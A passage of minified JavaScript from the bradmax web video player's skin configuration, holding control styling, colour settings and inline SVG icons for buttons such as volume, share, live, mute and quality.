68.1406,38.7031C70.0469,38.7031 71.6719,38.0312 73.0156,36.6875L81.8281,27.9687C83.1719,26.625 83.8438,25 83.8438,23.0937L83.8438,23.0937Z\\" style=\\"fill-opacity:0.121569;fill-rule:nonzero;\\"/> </g> </svg> ","VolumeButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_VOLUME"},"over.volume":{"iconPadding":10,"icon":"ICON_VOLUME"},"over.mute":{"iconPadding":10,"icon":"ICON_MUTE"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95,"icon":"ICON_VOLUME"},"normal.mute":{"iconPadding":10,"icon":"ICON_MUTE"},"normal.volume":{"iconPadding":10,"icon":"ICON_VOLUME"}},"ICON_SHARE_EMBED":"<?xml version=\\"1.0\\" standalone=\\"no\\"?><!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"><svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"><g id=\\"share embed\\"><g><path d=\\"M94.4422,48.6485l-22.9694,-22.9694c-0.714252,-0.714252 -1.978,-0.714252 -2.69225,0l-4.97976,4.97976c-0.743774,0.743774 -0.743774,1.94943 0,2.69321l16.644,16.6421l-16.643,16.6449c-0.743774,0.743774 -0.743774,1.94943 0,2.69321l4.97976,4.97976c0.357126,0.357126 0.841865,0.559021 1.3466,0.559021c0.503786,0 0.989477,-0.201895 1.3466,-0.559021l22.9675,-22.9684c0.743774,-0.744726 0.743774,-1.95134 0,-2.69511Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/><path d=\\"M36.1983,66.6391l-16.6411,-16.643l16.644,-16.6421c0.357126,-0.357126 0.558069,-0.840912 0.558069,-1.3466c0,-0.504738 -0.19999,-0.989477 -0.558069,-1.3466l-4.97976,-4.97976c-0.357126,-0.357126 -0.841865,-0.558069 -1.3466,-0.558069c-0.504738,0 -0.989477,0.200943 -1.3466,0.558069l-22.9703,22.9675c-0.743774,0.743774 -0.743774,1.94943 0,2.69416l22.9694,22.9684c0.357126,0.357126 0.841865,0.559021 1.3466,0.559021c0.504738,0 0.989477,-0.201895 1.3466,-0.559021l4.97976,-4.97976c0.743774,-0.742822 0.743774,-1.94848 -0.00190467,-2.69225Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/><path d=\\"M63.0618,17.9519c-0.241893,-0.443788 -0.649493,-0.773297 -1.13328,-0.916147l-4.03695,-1.19137c-1.00757,-0.299033 -2.06847,0.279034 -2.3656,1.28756l-18.741,63.4665c-0.14285,0.484739 -0.0876149,1.00567 0.153326,1.4485c0.240941,0.444741 0.649493,0.773297 1.13328,0.917099l4.03695,1.19137c0.179991,0.0533308 0.361888,0.0790439 0.539974,0.0790439c0.821866,0 1.58088,-0.537117 1.82563,-1.3666l18.741,-63.4675c0.14285,-0.484739 0.0885672,-1.00567 -0.153326,-1.4485Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/></g></g></svg>","MessageHolder":{"normal":{"color":"COLOR_BACKDROP","alpha":0.75}},"EndSplashCountdownContent":{"normal":{"color":"COLOR_CONTROLS_0","borderRadius":8}},"SeriesBufferSpinner":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"rotationSpeed":45,"rotationTimeInterval":64,"icon":"ICON_SPINNER","iconColor":"COLOR_TEXT"}},"COLORS_SHADE_MAP_BASE":"@rgb:#4A4A4A","AudioButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_AUDIO"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"ICON_LIVE":"<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\" xmlns=\\"http://www.w3.org/2000/svg\\"> <g id=\\"live\\"> <circle style=\\"fill: rgb(218, 54, 54);\\" cx=\\"19.974\\" cy=\\"51.077\\" r=\\"15.804\\" transform=\\"matrix(0.943772, 0, 0, 0.910487, -3.935531, 3.495057)\\"/> <path d=\\"M 40.084 37.291 L 40.084 60.013 L 51.433 60.013 L 51.433 62.926 L 36.541 62.926 L 36.541 37.291 L 40.084 37.291 Z M 55.2 44.806 L 58.47 44.806 L 58.47 62.926 L 55.2 62.926 L 55.2 44.806 Z M 59.202 39.119 C 59.202 39.426 59.137 39.711 59.005 39.975 C 58.875 40.247 58.705 40.49 58.496 40.704 C 58.277 40.909 58.028 41.071 57.75 41.189 C 57.472 41.308 57.171 41.368 56.849 41.368 C 56.534 41.368 56.243 41.308 55.973 41.189 C 55.694 41.071 55.449 40.909 55.24 40.704 C 55.022 40.49 54.852 40.247 54.731 39.975 C 54.609 39.711 54.548 39.426 54.548 39.119 C 54.548 38.804 54.609 38.506 54.731 38.225 C 54.852 37.944 55.022 37.701 55.24 37.496 C 55.449 37.282 55.694 37.116 55.973 36.998 C 56.243 36.88 56.534 36.819 56.849 36.819 C 57.171 36.819 57.472 36.88 57.75 36.998 C 58.028 37.116 58.277 37.282 58.496 37.496 C 58.705 37.701 58.875 37.944 59.005 38.225 C 59.137 38.506 59.202 38.804 59.202 39.119 Z M 69.424 62.926 L 61.866 44.806 L 64.547 44.806 C 64.8 44.806 65.012 44.87 65.187 44.997 C 65.352 45.134 65.475 45.291 65.553 45.471 L 70.248 57.124 C 70.421 57.559 70.555 57.99 70.653 58.416 C 70.748 58.849 70.839 59.275 70.927 59.693 C 71.023 59.275 71.127 58.849 71.241 58.416 C 71.354 57.99 71.493 57.559 71.659 57.124 L 76.418 45.471 C 76.497 45.275 76.614 45.113 76.771 44.985 C 76.936 44.866 77.141 44.806 77.386 44.806 L 79.935 44.806 L 72.378 62.926 L 69.424 62.926 Z M 89.823 44.512 C 90.929 44.512 91.954 44.695 92.895 45.061 C 93.837 45.428 94.647 45.952 95.326 46.633 C 96.014 47.323 96.551 48.17 96.935 49.176 C 97.319 50.182 97.51 51.332 97.51 52.626 C 97.51 53.121 97.452 53.453 97.341 53.624 C 97.236 53.793 97.031 53.879 96.726 53.879 L 84.383 53.879 C 84.41 55.02 84.566 56.013 84.854 56.856 C 85.15 57.709 85.555 58.416 86.07 58.977 C 86.584 59.548 87.195 59.975 87.9 60.255 C 88.607 60.536 89.399 60.677 90.28 60.677 C 91.099 60.677 91.805 60.583 92.399 60.396 C 92.981 60.208 93.487 60.009 93.915 59.795 C 94.341 59.582 94.7 59.382 94.987 59.195 C 95.275 59.007 95.524 58.913 95.733 58.913 C 96.001 58.913 96.21 59.016 96.36 59.22 L 97.275 60.383 C 96.864 60.86 96.381 61.274 95.824 61.623 C 95.265 61.98 94.664 62.271 94.02 62.492 C 93.382 62.721 92.72 62.892 92.032 63.003 C 91.353 63.122 90.676 63.181 90.006 63.181 C 88.724 63.181 87.542 62.968 86.462 62.543 C 85.381 62.117 84.449 61.495 83.665 60.677 C 82.871 59.859 82.256 58.849 81.82 57.648 C 81.384 56.447 81.168 55.064 81.168 53.495 C 81.168 52.234 81.364 51.054 81.756 49.956 C 82.156 48.857 82.727 47.907 83.469 47.105 C 84.208 46.297 85.119 45.662 86.2 45.202 C 87.273 44.742 88.48 44.512 89.823 44.512 Z M 89.888 46.863 C 88.319 46.863 87.081 47.307 86.175 48.192 C 85.276 49.078 84.714 50.31 84.489 51.885 L 94.582 51.885 C 94.582 51.145 94.478 50.466 94.268 49.853 C 94.059 49.24 93.753 48.713 93.353 48.269 C 92.952 47.818 92.458 47.468 91.875 47.221 C 91.3 46.982 90.637 46.863 89.888 46.863 Z\\" style=\\"fill: white;\\"/> </g> </svg>","SeriesButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_PLAYLIST"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"ICON_AD_MUTE":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"volume\\"> <g> <path d=\\"M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </g> </svg> ","ControlbarDurationLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"COLOR_CONTROLS_2":"@rgb:#2d2d2d","SeriesPopupItemDescription":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12},"selected":{"fontColor":"COLOR_BASE_1","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"EndSplashSocialEmbed":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_EMBED"}},"ControlbarLiveButton":{"normal":{"iconPadding":4,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_LIVE"},"normal.sync":{"iconPadding":4,"icon":"ICON_LIVE"},"over.sync":{"iconPadding":4,"icon":"ICON_LIVE"},"over":{"iconPadding":4,"color":"COLOR_CONTROLS_2","alpha":0.95,"icon":"ICON_LIVE"},"over.notsync":{"iconPadding":4,"icon":"ICON_LIVE_NOTSYNC"},"normal.notsync":{"iconPadding":4,"icon":"ICON_LIVE_NOTSYNC"}},"COLOR_CONTROLS_0":"@rgb:#2D2D2D","AudioPopupItemRenderer":{"normal":{"color":"COLOR_CONTROLS_1"},"selected":{"color":"COLOR_CONTROLS_0"},"over":{"color":"COLOR_BASE_0"}},"ICON_AD_UNMUTE":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"Layer24\\"> <g id=\\"mute\\"> <g id=\\"volume\\"> <g> <path d=\\"M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </g> <path d=\\"M12.4687,5.41781L5.41781,12.4687L87.5313,94.5822L94.5822,87.5313L12.4687,5.41781Z\\" style=\\"fill:white;\\"/> <path d=\\"M94.5822,12.4687L87.5313,5.41781L5.41781,87.5313L12.4687,94.5822L94.5822,12.4687Z\\" style=\\"fill:white;\\"/> </g> </g> </svg> ","ICON_MINIMIZE":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"minimize\\"> <path d=\\"M84.0544,4.64639L67.3349,21.9364L56.0991,8.06949L56.0991,44.012L92.0416,44.012L78.1747,32.7762L95.4647,16.0567L84.0544,4.64639Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> <path d=\\"M8.04483,56.1094L21.7612,67.2116L4.48025,83.9232L15.8906,95.3335L32.6192,78.0343L43.9873,92.0519L43.9873,56.1094L8.04483,56.1094L8.04483,56.1094Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </svg> ","EndSplashSocialMail":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_MAIL"}},"ARROW_UP":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g> <path d=\\"M88.2595,78.5863L49.9998,41.899L11.7404,78.5863L1.16927,68.4496L49.9998,21.6255L98.8307,68.4496L88.2595,78.5863Z\\"/> </g> </svg> ","AdvertisementsTime":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":16}},"EndSplashTilesItemImageSpinner":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"rotationSpeed":45,"rotationTimeInterval":64,"icon":"ICON_SPINNER","iconColor":"COLOR_CONTROLS_1"}},"ICON_RELOAD":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <path id=\\"refresh\\" d=\\"M79.4,20.6c-7.35,-7.875 -17.85,-12.6 -29.4,-12.6c-23.1,0 -42,18.9 -42,42c0,23.1 18.9,42 42,42c19.425,0 35.7,-13.65 40.425,-31.5l-11.025,0c-4.2,12.075 -15.75,21 -29.4,21c-17.325,0 -31.5,-14.175 -31.5,-31.5c0,-17.325 14.175,-31.5 31.5,-31.5c8.925,0 16.275,3.675 22.05,9.45l-16.8,16.8l36.75,0l0,-36.75l-12.6,12.6Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/> </svg> ","ICON_AD_PLAY_OVER":"<svg xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xmlns=\\"http://www.w3.org/2000/svg\\" version=\\"1.1\\" x=\\"0px\\" y=\\"0px\\" viewBox=\\"0 0 100 100\\" xml:space=\\"preserve\\"> <g> <rect fill=\\"rgba(68,68,68,0.75)\\" x=\\"0\\" y=\\"0\\" rx=\\"6\\" ry=\\"6\\" width=\\"100px\\" height=\\"100px\\"/> <path fill=\\"rgba(255,255,255,1)\\" d=\\"M40,35 L40,65 L65,50 L40,35 Z\\"/> </g> </svg>"}'),qc.skinIcons={element:'<svg xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" width="0" version="1.1" id="bradmax_player_v2.14.380-acd86bff1780b302209b59079cd538a3" height="0"><defs><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SHARE_MAIL_bradmax_player_v2.14.380" height="100%"><g id="Layer2"><path style="fill:#fff;fill-rule:nonzero;" d="M7.97,26.428c2.441,1.312 36.241,19.468 37.499,20.144c1.259,0.676 2.889,1.002 4.531,1.002c1.643,0 3.271,-0.326 4.531,-1.002c1.258,-0.676 35.058,-18.831 37.498,-20.144c2.443,-1.311 4.755,-5.428 0.268,-5.428l-84.594,0c-4.484,0 -2.176,4.117 0.267,5.428ZM93.064,36.428c-2.773,1.447 -36.835,19.26 -38.533,20.144c-1.699,0.887 -2.889,1.002 -4.531,1.002c-1.642,0 -2.832,-0.115 -4.531,-1.002c-1.698,-0.884 -35.758,-18.697 -38.533,-20.144c-1.953,-1.017 -1.936,0.176 -1.936,1.098c0,0.922 0,36.679 0,36.679c0,2.096 2.792,4.795 4.959,4.795l80.082,0c2.167,0 4.959,-2.699 4.959,-4.795c0,0 0,-35.757 0,-36.679c0,-0.922 0.02,-2.115 -1.936,-1.098Z"/></g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ARROW_RIGHT_bradmax_player_v2.14.380" height="100%"><g>\n        <path d="M19.1969,11.5335L30.0125,0.905141L79.9721,50L30.0125,99.0949L19.1969,88.4665L58.3409,50L19.1969,11.5335Z"/>\n    </g></g><g width="100%" id="bradmax_ICON_PIP_bradmax_player_v2.14.380" height="100%"><g transform="matrix(4.166667, 0, 0, 4.166667, 0, 0)" style="" stroke-width="1" stroke="none" id="pip_enter" fill-rule="evenodd" fill="none">\n      <path fill="#ffffff" d="M 4.48 12.674 L 4.437 17.544 C 4.426 17.574 13.256 17.544 13.216 17.534 L 13.267 12.631 C 13.287 12.612 5.408 12.708 4.48 12.674 Z M 21.014 3.033 L 3.014 3.033 C 1.914 3.033 1.014 3.933 1.014 5.033 L 0.988 18.983 C 0.946 20.161 1.622 20.927 2.938 20.943 L 3.014 5.033 L 21.014 5.033 L 21.014 19.033 L 2.974 18.961 L 2.924 20.932 L 21.083 20.966 C 22.183 20.966 23.014 20.133 23.014 19.033 L 23.014 5.033 C 23.014 3.933 22.114 3.033 21.014 3.033 Z"/>\n      <rect y="0" x="0" width="24" id="bounds" height="24"/>\n  </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ARROW_DOWN_bradmax_player_v2.14.380" height="100%"><g>\n        <path d="M88.2593,21.6257L98.8307,31.7626L49.9998,78.5861L1.16927,31.7626L11.7406,21.6257L49.9998,58.3126L88.2593,21.6257Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_VOLUME_bradmax_player_v2.14.380" height="100%"><g id="volume">\n        <g>\n            <path style="fill:white;fill-rule:nonzero;" d="M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z"/>\n        </g>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_AIRPLAY_bradmax_player_v2.14.380" height="100%"><g transform="matrix(1.692047, 0, 0, 1.901141, -56.175961, -72.623573)" style="fill:#ffffff" id="airplay">\n    <path transform="matrix(1, 0, 0, 1, 0, 0)" style="overflow: visible;" d="M81,88.8c0.4,0.5,0.4,1.3-0.1,1.7c-0.2,0.2-0.5,0.3-0.8,0.3H44.9c-0.7,0-1.2-0.5-1.2-1.2 c0-0.3,0.1-0.6,0.3-0.8l17.5-20.1c0.5-0.6,1.3-0.6,1.9-0.1c0,0,0.1,0.1,0.1,0.1L81,88.8z M76.9,77.7l-2.8-3.3h10.5 c0.9,0.1,1.7-0.1,2.5-0.4c0.5-0.3,1-0.7,1.2-1.2c0.4-0.8,0.5-1.7,0.4-2.5V45.8c0.1-0.9-0.1-1.7-0.4-2.5c-0.3-0.5-0.7-1-1.2-1.2 c-0.8-0.4-1.7-0.5-2.5-0.4h-44c-0.9-0.1-1.7,0.1-2.5,0.4c-0.5,0.3-1,0.7-1.2,1.2c-0.4,0.8-0.5,1.7-0.4,2.5v24.4 c-0.1,0.9,0.1,1.7,0.4,2.5c0.3,0.5,0.7,1,1.2,1.2c0.8,0.4,1.7,0.5,2.5,0.4h10.5l-2.8,3.3h-6.7c-3,0-4-0.3-5-0.9 c-1.1-0.6-1.9-1.4-2.5-2.5c-0.6-1.1-0.9-2.1-0.9-5V46.7c0-3,0.3-4,0.9-5.1c0.6-1.1,1.4-1.9,2.5-2.5c1.1-0.6,2.1-0.9,5-0.9h42.2 c3,0,4,0.3,5.1,0.9c1.1,0.6,1.9,1.4,2.5,2.5c0.6,1.1,0.9,2.1,0.9,5.1v22.5c0,3-0.3,4-0.9,5c-0.6,1.1-1.4,1.9-2.5,2.5 c-1.1,0.6-2.1,0.9-5.1,0.9L76.9,77.7z"/>\n  </g></g><g width="100%" id="bradmax_ICON_CLOSE_bradmax_player_v2.14.380" height="100%"><g stroke="#FFF">\n\t\t<circle stroke-width="6" stroke-miterlimit="10" r="47" fill="none" cy="50" cx="50"></circle>\n\t\t<line y2="28.787" y1="71.213" x2="28.787" x1="71.214" stroke-width="6" stroke-miterlimit="10" fill="none"></line>\n\t\t<line y2="28.787" y1="71.213" x2="71.214" x1="28.787" stroke-width="6" stroke-miterlimit="10" fill="none"></line>\n\t</g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_PAUSE_bradmax_player_v2.14.380" height="100%"><g id="pause">\n        <g>\n            <path style="fill:white;fill-rule:nonzero;" d="M72.5,5C66.1074,5 60.9286,6.96586 60.9286,13.3571L60.9286,86.6429C60.9286,93.0341 66.1074,95 72.5,95C78.8913,95 84.0714,93.0341 84.0714,86.6429L84.0714,13.3571C84.0714,6.96586 78.8913,5 72.5,5Z"/>\n            <path style="fill:white;fill-rule:nonzero;" d="M27.5,5C21.1074,5 15.9286,6.96586 15.9286,13.3571L15.9286,86.6429C15.9286,93.0341 21.1074,95 27.5,95C33.8913,95 39.0714,93.0341 39.0714,86.6429L39.0714,13.3571C39.0714,6.96586 33.8913,5 27.5,5Z"/>\n        </g>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ARROW_LEFT_bradmax_player_v2.14.380" height="100%"><g>\n        <path d="M80.3876,88.4665L69.572,99.0949L19.6124,50L69.572,0.905141L80.3876,11.5335L41.2436,50L80.3876,88.4665Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_QUALITY_bradmax_player_v2.14.380" height="100%"><g>\n\t\t<path style="fill:#fff;fill-rule:nonzero;" d="M98.821,43.995l-12.276,-5.378c-0.659,-2.219 -1.559,-4.378 -2.659,-6.437l4.858,-12.456c0.3,-0.739 0.12,-1.579 -0.439,-2.139l-5.918,-5.917c-0.56,-0.56 -1.419,-0.74 -2.139,-0.44l-12.415,4.898c-2.059,-1.1 -4.218,-1.979 -6.477,-2.659l-5.338,-12.255c-0.3,-0.74 -1.02,-1.2 -1.82,-1.2l-8.376,0c-0.8,0 -1.52,0.46 -1.84,1.2l-5.338,12.215c-2.179,0.7 -4.338,1.579 -6.437,2.659l-12.435,-4.858c-0.74,-0.3 -1.579,-0.12 -2.139,0.44l-5.918,5.917c-0.56,0.56 -0.739,1.4 -0.459,2.139l4.878,12.476c-1.08,2.059 -1.96,4.198 -2.659,6.417l-12.276,5.378c-0.719,0.32 -1.199,1.039 -1.199,1.819l0,8.337c0,0.8 0.48,1.519 1.199,1.819l12.276,5.378c0.699,2.219 1.599,4.378 2.659,6.437l-4.878,12.455c-0.28,0.74 -0.101,1.58 0.459,2.16l5.918,5.857c0.56,0.56 1.399,0.74 2.139,0.44l12.435,-4.818c2.099,1.079 4.258,1.959 6.437,2.659l5.338,12.235c0.32,0.72 1.04,1.199 1.84,1.199l8.376,0c0.8,0 1.52,-0.479 1.82,-1.219l5.338,-12.255c2.259,-0.68 4.418,-1.559 6.477,-2.659l12.415,4.858c0.74,0.3 1.579,0.12 2.139,-0.44l5.918,-5.857c0.559,-0.58 0.739,-1.42 0.439,-2.16l-4.858,-12.455c1.1,-2.059 2,-4.218 2.659,-6.437l12.276,-5.378c0.719,-0.3 1.179,-1.019 1.179,-1.819l0,-8.337c0,-0.78 -0.46,-1.499 -1.179,-1.819Zm-48.821,28.488c-12.395,0 -22.491,-10.096 -22.491,-22.491c0,-12.415 10.096,-22.491 22.491,-22.491c12.415,0 22.491,10.076 22.491,22.491c0,12.395 -10.076,22.491 -22.491,22.491Z"/>\n\t</g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SHARE_FACEBOOK_bradmax_player_v2.14.380" height="100%"><g id="Layer2"><path style="fill:#fff;fill-rule:nonzero;" id="Facebook" d="M38.0779,22.4301c0,2.26804 0,12.3912 0,12.3912l-9.07822,0l0,15.1521l9.07822,0l0,45.0266l18.6486,0l0,-45.0253l12.5141,0c0,0 1.172,-7.26529 1.7401,-15.2092c-1.62879,0 -14.1837,0 -14.1837,0c0,0 0,-8.81498 0,-10.3601c0,-1.54843 2.03326,-3.63129 4.04288,-3.63129c2.00585,0 6.23935,0 10.1604,0c0,-2.06297 0,-9.191 0,-15.7741c-5.23454,0 -11.1897,0 -13.8148,0c-19.5686,-0.00104624 -19.1077,15.1661 -19.1077,17.4301Z"/></g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_MUTE_bradmax_player_v2.14.380" height="100%"><g id="Layer24">\n        <g id="mute">\n            <g id="volume">\n                <g>\n                    <path style="fill:white;fill-rule:nonzero;" d="M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z"/>\n                </g>\n            </g>\n            <path style="fill:white;" d="M12.4687,5.41781L5.41781,12.4687L87.5313,94.5822L94.5822,87.5313L12.4687,5.41781Z"/>\n            <path style="fill:white;" d="M94.5822,12.4687L87.5313,5.41781L5.41781,87.5313L12.4687,94.5822L94.5822,12.4687Z"/>\n        </g>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SUBTITLES_bradmax_player_v2.14.380" height="100%"><g id="subtitles">\n        <path style="fill:white;fill-rule:nonzero;" id="closed-caption" d="M85,10L15,10C9.5,10 5,14.5 5,20L5,80C5,85.5 9.5,90 15,90L85,90C90.5,90 95,85.5 95,80L95,20C95,14.5 90.5,10 85,10ZM45,45L37.5,45L37.5,42.5L27.5,42.5L27.5,57.5L37.5,57.5L37.5,55L45,55L45,60C45,63 43,65 40,65L25,65C22,65 20,63 20,60L20,40C20,37 22,35 25,35L40,35C43,35 45,37 45,40L45,45ZM80,45L72.5,45L72.5,42.5L62.5,42.5L62.5,57.5L72.5,57.5L72.5,55L80,55L80,60C80,63 78,65 75,65L60,65C57,65 55,63 55,60L55,40C55,37 57,35 60,35L75,35C78,35 80,37 80,40L80,45Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_PLAYLIST_bradmax_player_v2.14.380" height="100%"><g id="channels">\n        <rect y="44.9455" 